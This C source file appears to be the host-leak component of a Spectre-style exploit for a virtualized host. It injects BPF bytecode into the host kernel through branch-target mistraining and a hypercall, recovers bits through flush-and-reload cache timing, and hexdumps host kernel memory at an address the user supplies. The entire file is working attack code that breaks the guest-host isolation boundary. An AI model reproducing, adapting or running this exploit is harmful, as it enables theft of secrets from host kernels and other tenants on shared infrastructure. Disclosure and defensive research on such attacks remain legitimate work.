#include "common.h"
#include <linux/filter.h>
#include <linux/bpf.h>

unsigned long shm_page_host_kernel_virt_addr;
struct page *shm_page;

struct cacheline *eviction_set;

// bit_idx in 0..7; 0 means leak byte&1, 1 means leak byte&2, 2 means leak byte&4.
// leaks to shm_page[0x800] or shm_page[0xc00].
int leak_bit(unsigned long target_byte_addr, int bit_idx) {
  unsigned long host_timing_leak_addr = shm_page_host_kernel_virt_addr/* + 0x800*/;
  struct bpf_insn evil_bytecode_instrs[] = {
    // rax = target_byte_addr
    { .code = BPF_LD | BPF_IMM | BPF_DW, .dst_reg = 0, .imm = target_byte_addr }, { .imm = target_byte_addr>>32 },
    // rdi = timing_leak_array
    { .code = BPF_LD | BPF_IMM | BPF_DW, .dst_reg = 1, .imm = host_timing_leak_addr }, { .imm = host_timing_leak_addr>>32 },
    // rax = *(u8*)rax
    { .code = BPF_LDX | BPF_MEM | BPF_B, .dst_reg = 0, .src_reg = 0, .off = 0 },
    // rax = rax << ...
    { .code = BPF_ALU64 | BPF_LSH | BPF_K, .dst_reg = 0, .imm = 10 - bit_idx },
    // rax = rax & 0x400
    { .code = BPF_ALU64 | BPF_AND | BPF_K, .dst_reg = 0, .imm = 0x400 },
    // rax = rdi + rax
    { .code = BPF_ALU64 | BPF_ADD | BPF_X, .dst_reg = 0, .src_reg = 1 },
    // *rax = 0x42
    //{ .code = BPF_ST | BPF_MEM | BPF_B, .dst_reg = 0, .off = 0/*x800*/, .imm = 0x42 },
    { .code = BPF_LDX | BPF_MEM | BPF_B, .dst_reg = 0, .src_reg = 0, .off = 0x800 },
    // clear rdi (rdi = rdi & 0)
    { .code = BPF_ALU64 | BPF_AND | BPF_K, .dst_reg = 1, .imm = 0 },
    // end
    { .code = BPF_JMP | BPF_EXIT }
  };

  long bad_iterations = 0;
  //time_t rt1 = time(NULL);
retry:;
  memcpy(shm_page->data + 128, evil_bytecode_instrs, sizeof(evil_bytecode_instrs));
  shm_page->data[0x800] = 1;
  shm_page->data[0xc00] = 1;

  clflush(shm_page->data + 0x800);
  clflush(shm_page->data + 0xc00);

  do_flushing_and_time(eviction_set, NULL);

  train_mispredict_and_hypercall(shm_page_host_kernel_virt_addr - 0xb0, shm_page_host_kernel_virt_addr + 128, RSI_CONTROLLED_CALL_ADDRESS);
  bool bit_is_0 = is_hot(shm_page->data + 0x800);
  bool bit_is_1 = is_hot(shm_page->data + 0xc00);
  if (bit_is_1 != bit_is_0) {
    return bit_is_1;
  } else {
    bad_iterations++;
    if (bad_iterations == 100)
      return -1;
    goto retry;
  }
}

int leak_byte(unsigned long target_byte_addr) {
  unsigned char res = 0;
  for (int bit_idx = 0; bit_idx < 8; bit_idx++) {
    int bit = leak_bit(target_byte_addr, bit_idx);
    if (bit == -1)
      return -1;
    res |= bit << bit_idx;
  }
  //printf("%s 0x%lx: 0x%02hhx\n", cur_time(), target_byte_addr, res);
  return res;
}

void hexdump_memory(unsigned long byte_offset_start, unsigned long byte_count) {
  if (byte_count % 16)
    errx(1, "hexdump_memory called with non-full line");
  time_t last_sec = 0;
  int bytes_per_sec = 0;
  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
          byte_offset += 16) {
    time_t cur_sec = time(NULL);
    if (cur_sec != last_sec) {
      last_sec = cur_sec;
      printf("%s ########## LEAK RATE: %d/sec ##########\n", cur_time(), bytes_per_sec);
      bytes_per_sec = 0;
    }
    bytes_per_sec += 16;

    int bytes[16];
    for (int i=0; i<16; i++) {
      bytes[i] = leak_byte(byte_offset + i);
    }
    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%s %08lx  ", cur_time(), byte_offset);
    for (int i=0; i<16; i++) {
      if (bytes[i] == -1) {
        linep += sprintf(linep, "?? ");
      } else {
        linep += sprintf(linep, "%02hhx ", (unsigned char)bytes[i]);
      }
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      if (bytes[i] == -1) {
        *(linep++) = '?';
      } else {
        if (isalnum(bytes[i]) || ispunct(bytes[i]) || bytes[i] == ' ') {
          *(linep++) = bytes[i];
        } else {
          *(linep++) = '.';
        }
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }
}

int main(int argc, char **argv) {
  if (argc != 3)
    errx(1, "invocation: ./host_leak <host_kernel_address> <length>");
  printf("%s === starting host_leak ===\n", cur_time());
  common_init();
  hot_cold_init();
  eviction_set = get_selected_eviction_set();

  shm_page = get_shared_page();
  shm_page_host_kernel_virt_addr = page_offset + shm_page->phys_addr + __builtin_offsetof(struct page, data);
  printf("host-virtual kernel address for shared page: 0x%lx\n", shm_page_host_kernel_virt_addr);

  ((unsigned long *)(shm_page->data))[0] = BPF_PROG_RUN_ADDRESS;

  hexdump_memory(strtoull(argv[1],NULL,0), strtoull(argv[2],NULL,0));
}
